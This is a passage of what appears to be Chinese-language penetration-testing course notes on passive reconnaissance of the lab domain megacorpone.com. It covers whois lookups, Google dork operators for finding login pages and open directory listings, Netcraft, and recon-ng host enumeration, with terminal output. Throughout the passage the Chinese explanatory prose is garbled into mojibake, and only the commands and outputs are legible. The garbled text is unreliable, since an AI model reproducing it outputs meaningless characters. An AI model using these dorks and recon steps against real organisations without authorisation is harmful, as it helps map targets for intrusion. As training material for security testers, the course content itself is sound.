US\nTech Phone: +1.9038836342\n...\nName Server: NS1.MEGACORPONE.COM\nName Server: NS2.MEGACORPONE.COM\nName Server: NS3.MEGACORPONE.COM\n...\n```\n\nå¹¶éæ‰€æœ‰è¿™äº›æ•°æ®éƒ½æ˜¯æœ‰ç”¨çš„ï¼Œä½†æˆ‘ä»¬ç¡®å®å‘ç°äº†ä¸€äº›æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚é¦–å…ˆï¼Œè¾“å‡ºç»“æœæ˜¾ç¤ºï¼ŒAlan Grofield æ³¨å†Œäº†è¿™ä¸ªåŸŸåã€‚æ ¹æ® Megacorp One çš„è”ç³»é¡µé¢ï¼ŒAlan æ˜¯ â€œIT å’Œå®‰å…¨æ€»ç›‘â€ã€‚\n\næˆ‘ä»¬è¿˜å‘ç°äº† Megacorp One çš„åç§°æœåŠ¡å™¨ã€‚åç§°æœåŠ¡å™¨æ˜¯ DNS çš„ä¸€ä¸ªç»„æˆéƒ¨åˆ†ï¼Œæˆ‘ä»¬åœ¨æ­¤ä¸åšç ”ç©¶ï¼Œä½†æˆ‘ä»¬åº”è¯¥æŠŠè¿™äº›æœåŠ¡å™¨æ·»åŠ åˆ°æˆ‘ä»¬çš„ç¬”è®°ä¸­ã€‚\n\né™¤äº†è¿™ç§æ ‡å‡†çš„å‰å‘æŸ¥æ‰¾ï¼ˆæ”¶é›†æœ‰å…³ DNS åç§°çš„ä¿¡æ¯ï¼‰å¤–ï¼Œwhois å®¢æˆ·ç«¯è¿˜å¯ä»¥è¿›è¡Œåå‘æŸ¥æ‰¾ã€‚å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª IP åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œåå‘æŸ¥è¯¢ï¼Œä»¥æ”¶é›†æ›´å¤šå…³äºå®ƒçš„ä¿¡æ¯ã€‚\n\n```bash\nkali@kali:~$ whois 38.100.193.70\n...\nNetRange: 38.0.0.0 - 38.255.255.255\nCIDR: 38.0.0.0/8\nNetName: COGENT-A\n...\nOrgName: PSINet, Inc.\nOrgId: PSI\nAddress: 2450 N Street NW\nCity: Washington\nStateProv: DC\nPostalCode: 20037\nCountry: US\nRegDate:\nUpdated: 2015-06-04\n...\n```\n\nåå‘æŸ¥è¯¢çš„ç»“æœä¸ºæˆ‘ä»¬æä¾›äº†å…³äºè°åœ¨æ‰˜ç®¡è¯¥ IP åœ°å€çš„ä¿¡æ¯ã€‚è¿™äº›ä¿¡æ¯ä»¥åå¯èƒ½ä¼šå¾ˆæœ‰ç”¨ï¼Œå°±åƒæˆ‘ä»¬æ”¶é›†çš„æ‰€æœ‰ä¿¡æ¯ä¸€æ ·ï¼Œæˆ‘ä»¬å°†æŠŠè¿™äº›ä¿¡æ¯æ·»åŠ åˆ°æˆ‘ä»¬çš„ç¬”è®°ä¸­ã€‚\n\n## Google Hacking\n\nâ€œGoogle Hackingâ€ ä¸€è¯æ˜¯ç”± Johnny Long åœ¨ 2001 å¹´æ¨å¹¿çš„ã€‚é€šè¿‡å‡ æ¬¡è®²åº§å’Œä¸€æœ¬éå¸¸å—æ¬¢è¿çš„ä¹¦ï¼ˆGoogle Hacking For Penetration Testersï¼‰ï¼Œä»–æ¦‚è¿°äº†å¦‚ä½•åˆ©ç”¨ Google è¿™æ ·çš„æœç´¢å¼•æ“æ¥å‘ç°å…³é”®ä¿¡æ¯ã€æ¼æ´å’Œé…ç½®é”™è¯¯çš„ç½‘ç«™ã€‚\n\nè¿™ç§æŠ€æœ¯çš„æ ¸å¿ƒæ˜¯å·§å¦™çš„æœç´¢å­—ç¬¦ä¸²å’Œè¿ç®—ç¬¦ï¼Œå…è®¸åˆ›é€ æ€§åœ°å®Œå–„æœç´¢æŸ¥è¯¢ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†éƒ½é€‚ç”¨äºå„ç§æœç´¢å¼•æ“ã€‚è¿™ä¸ªè¿‡ç¨‹æ˜¯åå¤è¿›è¡Œçš„ï¼Œä»å¹¿æ³›çš„æœç´¢å¼€å§‹ï¼Œç”¨è¿ç®—ç¬¦ç¼©å°èŒƒå›´ï¼Œä»¥ç­›é€‰å‡ºä¸ç›¸å…³æˆ–ä¸æ„Ÿå…´è¶£çš„ç»“æœã€‚\n\nè®©æˆ‘ä»¬å°è¯•ä¸€ä¸‹è¿™äº›æ“ä½œç¬¦ï¼Œæ„Ÿå—ä¸€ä¸‹å®ƒä»¬æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚\n\nç½‘ç«™æ“ä½œç¬¦å°†æœç´¢é™åˆ¶åœ¨ä¸€ä¸ªå•ä¸€çš„åŸŸã€‚æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªè¿ç®—ç¬¦æ¥ç²—ç•¥äº†è§£ä¸€ä¸ªç»„ç»‡çš„ç½‘ç»œå­˜åœ¨ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/497bebc0-235b-4ce4-8a04-1367e1cba9bc/Untitled.png)\n\nç„¶åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿›ä¸€æ­¥çš„è¿ç®—ç¬¦æ¥ç¼©å°è¿™äº›ç»“æœã€‚ä¾‹å¦‚ï¼Œfiletypeï¼ˆæˆ– extï¼‰æ“ä½œç¬¦å°†æœç´¢ç»“æœé™åˆ¶åœ¨æŒ‡å®šçš„æ–‡ä»¶ç±»å‹ã€‚\n\nåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ç»“åˆè¿ç®—ç¬¦æ¥å®šä½ [www.megacorpone.com](http://www.megacorpone.com/)ï¼ˆsite:megacorpone.comï¼‰ä¸Šçš„ PHP æ–‡ä»¶ï¼ˆfiletype:phpï¼‰ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/78777c56-8056-4aba-b004-d607fec2acc6/Untitled.png)\n\næˆ‘ä»¬åªå¾—åˆ°ä¸€ä¸ªç»“æœï¼Œä½†è¿™æ˜¯ä¸€ä¸ªæœ‰è¶£çš„ç»“æœã€‚æˆ‘ä»¬çš„æŸ¥è¯¢æ‰¾åˆ°äº† AlivenVault OSSIM å®ä¾‹çš„ç™»å½•é¡µé¢ï¼Œè¿™æ˜¯ä¸€ä¸ªå®‰å…¨ä¿¡æ¯å’Œäº‹ä»¶ç®¡ç†ï¼ˆSIEMï¼‰å¹³å°ã€‚å®‰å…¨å›¢é˜Ÿä½¿ç”¨ SIEM å·¥å…·æ¥ç›‘æ§åº”ç”¨ç¨‹åºå’Œç½‘ç»œæµé‡çš„æ¶æ„æ´»åŠ¨ã€‚é€šå¸¸ï¼Œè¿™äº›å·¥å…·åªåœ¨å†…éƒ¨ç½‘ç»œä¸Šå¯ç”¨ã€‚æˆ‘ä»¬åº”è¯¥æ³¨æ„è¿™ä¸ª URLï¼Œå› ä¸ºå¦‚æœæˆ‘ä»¬èƒ½åœ¨ä¸»åŠ¨å¼€å‘é˜¶æ®µæ‰¾åˆ°ç”¨æˆ·å‡­è¯æ¥ç™»å½•ï¼Œå®ƒå¯èƒ½ä¼šè¢«è¯æ˜æ˜¯æœ‰ç”¨çš„ã€‚\n\next æ“ä½œç¬¦ä¹Ÿå¯ä»¥å¸®åŠ©è¾¨åˆ«ç½‘ç«™ä¸Šå¯èƒ½ä½¿ç”¨çš„ç¼–ç¨‹è¯­è¨€ã€‚åƒ ext:jspã€ext:cfmã€ext:pl è¿™æ ·çš„æœç´¢å°†åˆ†åˆ«æ‰¾åˆ°ç´¢å¼•çš„ Java Server Pagesã€Coldfusion å’Œ Perl ç½‘é¡µã€‚\n\næˆ‘ä»¬è¿˜å¯ä»¥ç”¨ `-` æ¥ä¿®æ”¹ä¸€ä¸ªæ“ä½œç¬¦ï¼Œä»¥ä¾¿ä»æœç´¢ä¸­æ’é™¤ç‰¹å®šçš„é¡¹ç›®ï¼Œç¼©å°æœç´¢ç»“æœçš„èŒƒå›´ã€‚\n\nä¾‹å¦‚ï¼Œä¸ºäº†æ‰¾åˆ°æœ‰è¶£çš„ã€é HTML çš„é¡µé¢ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ site:megacorpone.com æ¥é™åˆ¶æœç´¢åˆ° [megacorpone.com](http://megacorpone.com) å’Œå­åŸŸï¼Œæ¥ç€ä½¿ç”¨ -filetype:html æ¥ä»ç»“æœä¸­æ’é™¤ HTML é¡µé¢ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1d380a2a-fc4c-4eea-a2fb-c6331d18a3c6/Untitled.png)\n\nåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å‘ç°äº†å‡ ä¸ªæœ‰è¶£çš„é¡µé¢ï¼ŒåŒ…æ‹¬ä¸€ä¸ªç®¡ç†æ§åˆ¶å°ã€‚\n\nåœ¨å¦ä¸€ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ intitle:â€index ofâ€â€œparent directoryâ€ çš„æœç´¢æ¥æ‰¾åˆ°æ ‡é¢˜ä¸­å«æœ‰ â€œindex ofâ€ çš„é¡µé¢ï¼Œä»¥åŠé¡µé¢ä¸­å«æœ‰ â€œparent directoryâ€ å­—æ ·çš„é¡µé¢ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bf5870d4-f165-484a-bd0f-d2a89291218c/Untitled.png)\n\nè¾“å‡ºæŒ‡çš„æ˜¯ç›®å½•åˆ—è¡¨é¡µï¼Œåˆ—å‡ºäº†æ²¡æœ‰ç´¢å¼•é¡µçš„ç›®å½•çš„æ–‡ä»¶å†…å®¹ã€‚åƒè¿™æ ·çš„é”™è¯¯é…ç½®ä¼šæš´éœ²å‡ºæœ‰è¶£çš„æ–‡ä»¶å’Œæ•æ„Ÿä¿¡æ¯ã€‚\n\nè¿™äº›åŸºæœ¬çš„ä¾‹å­åªè§¦åŠæˆ‘ä»¬å¯ä»¥ç”¨æœç´¢æ“ä½œç¬¦åšçš„äº‹æƒ…çš„è¡¨é¢ï¼Œè°·æ­Œé»‘å®¢æ•°æ®åº“ï¼ˆGHDBï¼‰åŒ…å«äº†å¤§é‡çš„åˆ›æ„æœç´¢ï¼Œå±•ç¤ºäº†ä½¿ç”¨ç»„åˆè¿ç®—ç¬¦è¿›è¡Œåˆ›æ„æœç´¢çš„åŠ›é‡ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ab846c69-da24-4d8b-a6cd-9e10df1d28c6/Untitled.png)\n\næŒæ¡è¿™äº›æ“ä½œè€…ï¼Œå†åŠ ä¸Šæ•é”çš„æ¨ç†èƒ½åŠ›ï¼Œæ˜¯æœ‰æ•ˆçš„æœç´¢å¼•æ“â€œé»‘å®¢â€çš„å…³é”®æŠ€èƒ½ã€‚\n\n### ç»ƒä¹ \n\n1. è°æ˜¯ MegaCorp One çš„æ³•å¾‹å‰¯æ€»è£ï¼Œä»–ä»¬çš„ç”µå­é‚®ä»¶åœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ\n2. ä½¿ç”¨ Google dorksï¼ˆä½ è‡ªå·±çš„æˆ– GHDB çš„ä»»ä½•ä¸€ä¸ªï¼‰æ¥æœç´¢ [www.megacorpone.com](http://www.megacorpone.com)ï¼Œå¯»æ‰¾æœ‰è¶£çš„æ–‡ä»¶ã€‚\n3. ä½ è¿˜èƒ½ç¡®å®šå“ªäº› MegaCorp One çš„å‘˜å·¥æ²¡æœ‰è¢«åˆ—å…¥ [www.megacorpone.com](http://www.megacorpone.com)ï¼Ÿ\n\n## Netcraft\n\nNetcraft æ˜¯ä¸€å®¶ä½äºè‹±å›½çš„äº’è”ç½‘æœåŠ¡å…¬å¸ï¼Œæä¾›ä¸€ä¸ªå…è´¹çš„é—¨æˆ·ç½‘ç«™ï¼Œæ‰§è¡Œå„ç§ä¿¡æ¯æ”¶é›†åŠŸèƒ½ã€‚ä½¿ç”¨è¯¸å¦‚ Netcraft æ‰€æä¾›çš„æœåŠ¡è¢«è®¤ä¸ºæ˜¯ä¸€ç§è¢«åŠ¨çš„æŠ€æœ¯ï¼Œå› ä¸ºæˆ‘ä»¬ä»ä¸ä¸ç›®æ ‡ç›´æ¥äº’åŠ¨ã€‚\n\nè®©æˆ‘ä»¬å›é¡¾ä¸€ä¸‹ Netcraft çš„ä¸€äº›åŠŸã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Netcraft çš„ DNS æœç´¢é¡µé¢ï¼ˆhttps://searchdns.netcraft.comï¼‰æ¥æ”¶é›†å…³äº [megacorpone.com](http://megacorpone.com) åŸŸåçš„ä¿¡æ¯ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b34d74e8-7ab7-4ec1-8598-057eec3f6726/Untitled.png)\n\nå¯¹äºå‘ç°çš„æ¯ä¸ªæœåŠ¡å™¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç‚¹å‡»æ¯ä¸ªç½‘ç«™ URL æ—è¾¹çš„å›¾æ ‡ï¼ŒæŸ¥çœ‹â€œç½‘ç«™æŠ¥å‘Šâ€ï¼Œæä¾›æœ‰å…³è¯¥æœåŠ¡å™¨çš„é¢å¤–ä¿¡æ¯å’Œå†å²ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/14b4a1ca-02f0-4381-91bc-4f26f35c1a90/Untitled.png)\n\næŠ¥å‘Šçš„å¼€å¤´æ¶‰åŠæ³¨å†Œä¿¡æ¯ã€‚ç„¶è€Œï¼Œå¦‚æœæˆ‘ä»¬å‘ä¸‹æ»šåŠ¨ï¼Œæˆ‘ä»¬å‘ç°å„ç§â€œç½‘ç«™æŠ€æœ¯â€æ¡ç›®ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f4bb9214-020c-492a-8cfe-58760f31ee15/Untitled.png)\n\nè¿™ä»½å­åŸŸå’ŒæŠ€æœ¯çš„æ¸…å•å°†åœ¨æˆ‘ä»¬è½¬å‘ç§¯æçš„ä¿¡æ¯æ”¶é›†å’Œåˆ©ç”¨æ—¶è¯æ˜æ˜¯æœ‰ç”¨çš„ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬å°†æŠŠä»–æ·»åŠ åˆ°æˆ‘ä»¬çš„ç¬”è®°ä¸­ã€‚\n\n### ç»ƒä¹ \n\n1. ä½¿ç”¨Netcraftæ¥ç¡®å®šåœ¨ [www.megacorpone.com](http://www.megacorpone.com/) ä¸Šè¿è¡Œçš„æ˜¯ä»€ä¹ˆåº”ç”¨æœåŠ¡å™¨ã€‚\n\n## Recon-ng\n\nRecon-ng æ˜¯ä¸€ä¸ªåŸºäºæ¨¡å—çš„æ¡†æ¶ï¼Œç”¨äºåŸºäºç½‘ç»œçš„ä¿¡æ¯æ”¶é›†ã€‚recon-ng è®²ä¸€ä¸ªæ¨¡å—çš„ç»“æœæ˜¾ç¤ºåœ¨ç»ˆç«¯ä¸Šï¼Œä½†å®ƒä¹Ÿå°†è¿™äº›ç»“æœå­˜å‚¨åœ¨æ•°æ®åº“ä¸­ã€‚recon-ng çš„å¤§éƒ¨åˆ†åŠŸèƒ½åœ¨äºå°†ä¸€ä¸ªæ¨¡å—çš„ç»“æœè¾“å…¥å¦ä¸€ä¸ªæ¨¡å—ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿè¿…é€Ÿæ‰©å¤§ä¿¡æ¯æ”¶é›†çš„èŒƒå›´ã€‚\n\nè®©æˆ‘ä»¬ç”¨ recon-ng æ¥æ±‡ç¼–å…³äº MegaCorp One çš„æœ‰è¶£æ•°æ®ã€‚ä¸ºäº†å¼€å§‹ï¼Œè®©æˆ‘ä»¬ç®€å•çš„è¿è¡Œ recon-ngã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/OSCP/exploits]\nâ””â”€# recon-ng \n[*] Version check disabled.\n\n    _/_/_/    _/_/_/_/    _/_/_/    _/_/_/    _/      _/            _/      _/    _/_/_/\n   _/    _/  _/        _/        _/      _/  _/_/    _/            _/_/    _/  _/       \n  _/_/_/    _/_/_/    _/        _/      _/  _/  _/  _/  _/_/_/_/  _/  _/  _/  _/  _/_/_/\n _/    _/  _/        _/        _/      _/  _/    _/_/            _/    _/_/  _/      _/ \n_/    _/  _/_/_/_/    _/_/_/    _/_/_/    _/      _/            _/      _/    _/_/_/    \n\n                                          /\\\\\n                                         / \\\\\\\\ /\\\\\n    Sponsored by...               /\\\\  /\\\\/  \\\\\\\\V  \\\\/\\\\\n                                 / \\\\\\\\/ // \\\\\\\\\\\\\\\\\\\\ \\\\\\\\ \\\\/\\\\\n                                // // BLACK HILLS \\\\/ \\\\\\\\\n                               www.blackhillsinfosec.com\n\n                  ____   ____   ____   ____ _____ _  ____   ____  ____\n                 |____] | ___/ |____| |       |   | |____  |____ |\n                 |      |   \\\\_ |    | |____   |   |  ____| |____ |____\n                                   www.practisec.com\n\n                      [recon-ng v5.1.1, Tim Tomes (@lanmaster53)]                       \n\n[*] No modules enabled/installed.\n\n[recon-ng][default] >\n```\n\næ ¹æ®è¾“å‡ºç»“æœï¼Œæˆ‘ä»¬éœ€è¦å®‰è£…å„ç§æ¨¡å—æ¥ä½¿ç”¨ recon-ngã€‚\n\næˆ‘ä»¬å¯ä»¥ä» recon-ng â€œMarketplaceâ€ ä¸­æ·»åŠ æ¨¡å—ï¼Œæˆ‘ä»¬å°†ç”¨ marketplace search ä»æç¤ºä¸­æœç´¢å¸‚åœºï¼Œæä¾›ä¸€ä¸ªæœç´¢å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ã€‚\n\nåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†æœç´¢åŒ…å« github è¿™ä¸ªè¯çš„æ¨¡å—ï¼š\n\n```bash\n[recon-ng][default] > marketplace search github\n[*] Searching module index for 'github'...\n\n  +------------------------------------------------------------------------------------------------+\n  |                       Path                      | Version |     Status    |  Updated   | D | K |\n  +------------------------------------------------------------------------------------------------+\n  | recon/companies-multi/github_miner              | 1.1     | not installed | 2020-05-15 |   | * |\n  | recon/profiles-contacts/github_users            | 1.0     | not installed | 2019-06-24 |   | * |\n  | recon/profiles-profiles/profiler                | 1.0     | not installed | 2019-06-24 |   |   |\n  | recon/profiles-repositories/github_repos        | 1.1     | not installed | 2020-05-15 |   | * |\n  | recon/repositories-profiles/github_commits      | 1.0     | not installed | 2019-06-24 |   | * |\n  | recon/repositories-vulnerabilities/github_dorks | 1.0     | not installed | 2019-06-24 |   | * |\n  +------------------------------------------------------------------------------------------------+\n\n  D = Has dependencies. See info for details.\n  K = Requires keys. See info for details.\n```\n\nè¯·æ³¨æ„ï¼Œä¸€äº›æ¨¡å—åœ¨ â€œKâ€ åˆ—ä¸­æ ‡æœ‰æ˜Ÿå·ã€‚è¿™äº›æ¨¡å—éœ€è¦ç¬¬ä¸‰æ–¹ä¾›åº”å•†çš„å‡­è¯æˆ– API ç§˜é’¥ã€‚recon-ng wiki ç»´æŠ¤ç€ä¸€ä»½å…¶æ¨¡å—æ‰€ä½¿ç”¨çš„ç§˜é’¥çš„ç®€çŸ­åˆ—è¡¨ã€‚å…¶ä¸­ä¸€äº›ç§˜é’¥å¯ç”¨äºå…è´¹è´¦æˆ·ï¼Œè€Œå¦ä¸€äº›åˆ™éœ€è¦è®¢é˜…ã€‚\n\næˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨æ¨¡å—åç§°åé¢çš„å¸‚åœºä¿¡æ¯æ¥äº†è§£æ›´å¤šå…³äºä¸€ä¸ªæ¨¡å—çš„ä¿¡æ¯ã€‚ç”±äº GitHub æ¨¡å—éœ€è¦ API ç§˜é’¥ï¼Œè®©æˆ‘ä»¬ç”¨è¿™ä¸ªå‘½ä»¤æ¥æ£€æŸ¥ recon/domains-hosts/google_site_web æ¨¡å—ã€‚\n\n```bash\n[recon-ng][default] > marketplace info recon/domains-hosts/google_site_web\n\n  +---------------------------------------------------------------------------------------------------------------------------------+\n  | path          | recon/domains-hosts/google_site_web                                                                             |\n  | name          | Google Hostname Enumerator                                                                                      |\n  | author        | Tim Tomes (@lanmaster53)                                                                                        |\n  | version       | 1.0                                                                                                             |\n  | last_updated  | 2019-06-24                                                                                                      |\n  | description   | Harvests hosts from Google.com by using the 'site' search operator. Updates the 'hosts' table with the results. |\n  | required_keys | []                                                                                                              |\n  | dependencies  | []                                                                                                              |\n  | files         | []                                                                                                              |\n  | status        | not installed                                                                                                   |\n  +---------------------------------------------------------------------------------------------------------------------------------+\n```\n\næ ¹æ®å®ƒçš„æè¿°ï¼Œè¿™ä¸ªæ¨¡å—ç”¨ â€œsiteâ€ æ“ä½œç¬¦æœæœè°·æ­Œï¼Œå®ƒä¸éœ€è¦ API ç§˜é’¥ã€‚è®©æˆ‘ä»¬ç”¨ marketplace install æ¥å®‰è£…è¿™ä¸ªæ¨¡å—ã€‚\n\n```bash\n[recon-ng][default] > marketplace install recon/domains-hosts/google_site_web\n[*] Module installed: recon/domains-hosts/google_site_web\n[*] Reloading modules...\n```\n\nå®‰è£…å®Œæ¨¡å—åï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ¨¡å—åŠ è½½ï¼Œåé¢è·Ÿä¸Šå®ƒçš„åå­—ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬ç”¨ info æ¥æ˜¾ç¤ºæ¨¡å—çš„ç»†èŠ‚å’Œæ‰€éœ€å‚æ•°ã€‚\n\n```bash\n[recon-ng][default] > modules load recon/domains-hosts/google_site_web\n[recon-ng][default][google_site_web] > info\n\n      Name: Google Hostname Enumerator\n    Author: Tim Tomes (@lanmaster53)\n   Version: 1.0\n\nDescription:\n  Harvests hosts from Google.com by using the 'site' search operator. Updates the 'hosts' table with\n  the results.\n\nOptions:\n  Name    Current Value  Required  Description\n  ------  -------------  --------  -----------\n  SOURCE  default        yes       source of input (see 'info' for details)\n\nSource Options:\n  default        SELECT DISTINCT domain FROM domains WHERE domain IS NOT NULL\n  <string>       string representing a single input\n  <path>         path to a file containing a list of inputs\n  query <sql>    database query returning one column of inputs\n```\n\næ³¨æ„ï¼Œç°åœ¨æˆ‘ä»¬å·²ç»å®‰è£…å¹¶åŠ è½½äº†è¯¥æ¨¡å—ï¼Œè¾“å‡ºåŒ…å«äº†å…³äºè¯¥æ¨¡å—çš„é¢å¤–ä¿¡æ¯ã€‚æ ¹æ®è¾“å‡ºç»“æœï¼Œè¯¥æ¨¡å—éœ€è¦ä½¿ç”¨ä¸€ä¸ªæºï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å‘æ”¶é›†çš„ä¿¡æ¯çš„ç›®æ ‡ã€‚\n\nåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨é€‰é¡¹ set SOURCE [megacorpone.com](http://megacorpone.com) æ¥è®¾ç½®æˆ‘ä»¬çš„ç›®æ ‡åŸŸã€‚\n\n```bash\n[recon-ng][default][google_site_web] > options set SOURCE megacorpone.com\nSOURCE => megacorpone.com\n```\n\næœ€åï¼Œæˆ‘ä»¬è¿è¡Œè¯¥æ¨¡å—\n\n```bash\n[recon-ng][default][google_site_web] > run\n---------------\nMEGACORPONE.COM\n---------------\n[*] Searching Google for: site:megacorpone.com\n[*] [host] www.megacorpone.com (<blank>)\n[*] [host] vpn.megacorpone.com (<blank>)\n[*] [host] www2.megacorpone.com (<blank>)\n[*] [host] siem.megacorpone.com (<blank>)\n[*] Searching Google for: site:megacorpone.com -site:www.megacorpone.com -\nsite:vpn.megacorpone.com -site:www2.megacorpone.com -site:siem.megacorpone.com\n-------\nSUMMARY\n-------\n[*] 4 total (4 new) hosts found.\n```\n\nè¿™äº›ç»“æœåæ˜ äº†æˆ‘ä»¬ä» Netcraft DNS æœç´¢ä¸­å‘ç°çš„æƒ…å†µã€‚ç„¶è€Œï¼Œæˆ‘ä»¬æ²¡æœ‰åœ¨è¿™é‡Œæµªè´¹æˆ‘ä»¬çš„æ—¶é—´ã€‚Recon-ng å°†ç»“æœå‚¨å­˜åœ¨æœ¬åœ°æ•°æ®åº“ä¸­ï¼Œè¿™äº›ç»“æœå°†åé¦ˆç»™å…¶ä»– recon-ng æ¨¡å—ã€‚\n\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ show hosts å‘½ä»¤æ¥æŸ¥çœ‹å­˜å‚¨çš„æ•°æ®ã€‚\n\n```bash\n[recon-ng][default][google_site_web] > back\n[recon-ng][default] > show\nShows various framework items\nUsage: show\n<companies|contacts|credentials|domains|hosts|leaks|locations|netblocks|ports|profiles\n|pushpins|repositories|vulnerabilities>\n\n[recon-ng][default] > show hosts\n+--------------------------------------------------------------------------------+\n| rowid |         host         | ip_address | region | country |      module     |\n+--------------------------------------------------------------------------------+\n| 1     | www.megacorpone.com  |            |        |         | google_site_web |\n| 2     | vpn.megacorpone.com  |            |        |         | google_site_web |\n| 3     | www2.megacorpone.com |            |        |         | google_site_web |\n| 4     | siem.megacorpone.com |            |        |         | google_site_web |\n+--------------------------------------------------------------------------------+\n[*] 4 rows returned\n[recon-ng][default] >\n```\n\næˆ‘ä»¬çš„æ•°æ®åº“ä¸­æœ‰å››ä¸ªä¸»æœºï¼Œä½†æ²¡æœ‰å…³äºä»–ä»¬çš„é¢å¤–ä¿¡æ¯ã€‚ä¹Ÿè®¸å¦ä¸€ä¸ªæ¨¡å—å¯ä»¥å¡«å…¥ IP åœ°å€ã€‚\n\n```bash\n[recon-ng][default] > marketplace info recon/hosts-hosts/resolve\n\n  +-------------------------------------------------------------------------------------------------+\n  | path          | recon/hosts-hosts/resolve                                                       |\n  | name          | Hostname Resolver                                                               |\n  | author        | Tim Tomes (@lanmaster53)                                                        |\n  | version       | 1.0                                                                             |\n  | last_updated  | 2019-06-24                                                                      |\n  | description   | Resolves the IP address for a host. Updates the 'hosts' table with the results. |\n  | required_keys | []                                                                              |\n  | dependencies  | []                                                                              |\n  | files         | []                                                                              |\n  | status        | not installed                                                                   |\n  +-------------------------------------------------------------------------------------------------+\n\n[recon-ng][default] >\n```\n\nè¯¥æ¨¡å—çš„æè¿°ç¬¦åˆæˆ‘ä»¬çš„éœ€è¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†ç”¨ marketplace install æ¥å®‰è£…å®ƒã€‚\n\n```bash\n[recon-ng][default] > marketplace install recon/hosts-hosts/resolve\n[*] Module installed: recon/hosts-hosts/resolve\n[*] Reloading modules...\n```\n\n<aside> ğŸ’¡ ä¸€ä¸ªâ€œæ— æ•ˆå‘½ä»¤â€çš„é”™è¯¯å¯èƒ½è¡¨æ˜æˆ‘ä»¬å¤„äºé”™è¯¯çš„å‘½ä»¤çº§åˆ«ã€‚å¦‚æœå‘ç”Ÿè¿™ç§æƒ…å†µï¼Œè¯·è¿”å›è¿è¡Œï¼Œå›åˆ°ä¸» recon-ng æç¤ºç¬¦ï¼Œå¹¶å†æ¬¡å°è¯•è¯¥å‘½ä»¤ã€‚\n\n</aside>\n\nä¸€æ—¦æ¨¡å—å®‰è£…å®Œæ¯•ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ¨¡å—åŠ è½½æ¥ä½¿ç”¨å®ƒï¼Œå¹¶è¿è¡Œ info æ¥æ˜¾ç¤ºæ¨¡å—åŠå…¶é€‰é¡¹çš„ä¿¡æ¯ã€‚\n\n```bash\n[recon-ng][default] >  modules load recon/hosts-hosts/resolve\n[recon-ng][default][resolve] > info\n\n      Name: Hostname Resolver\n    Author: Tim Tomes (@lanmaster53)\n   Version: 1.0\n\nDescription:\n  Resolves the IP address for a host. Updates the 'hosts' table with the results.\n\nOptions:\n  Name    Current Value  Required  Description\n  ------  -------------  --------  -----------\n  SOURCE  default        yes       source of input (see 'info' for details)\n\nSource Options:\n  default        SELECT DISTINCT host FROM hosts WHERE host IS NOT NULL AND ip_address IS NULL\n  <string>       string representing a single input\n  <path>         path to a file containing a list of inputs\n  query <sql>    database query returning one column of inputs\n\nComments:\n  * Note: Nameserver must be in IP form.\n```\n\nä»ä¸Šé¢çš„è¾“å‡ºå¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸ªæ¨¡å—å°†ä¸ºä¸€ä¸ªä¸»æœºè§£æ IP åœ°å€ã€‚æˆ‘ä»¬éœ€è¦æä¾›æˆ‘ä»¬æƒ³è¦è§£æçš„ IP åœ°å€ä½œä¸ºæˆ‘ä»¬çš„æ¥æºã€‚æˆ‘ä»¬å¯ä»¥ä¸ºæ¥æºè®¾ç½®å››ä¸ªé€‰é¡¹ï¼šé»˜è®¤ã€å­—ç¬¦ä¸²ã€è·¯å¾„å’ŒæŸ¥è¯¢ã€‚æ¯ä¸ªé€‰é¡¹æ—è¾¹éƒ½æœ‰ä¸€ä¸ªæè¿°ï¼Œå¦‚æ¸…å•ä¸­æ‰€ç¤ºã€‚ä¾‹å¦‚ï¼Œåœ¨ â€œgoogle_site_webâ€ é‡ç»„æ¨¡å—ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚\n\nç„¶è€Œï¼Œè¿™æ¬¡æˆ‘ä»¬æƒ³åˆ©ç”¨æ•°æ®åº“ã€‚å¦‚æœæˆ‘ä»¬ä½¿ç”¨â€œé»˜è®¤â€å€¼ï¼Œrecon-ng å°†åœ¨å…¶æ•°æ®åº“ä¸­ä¸ºä»»ä½•æœ‰ä¸»æœºåä½†æ²¡æœ‰ IP 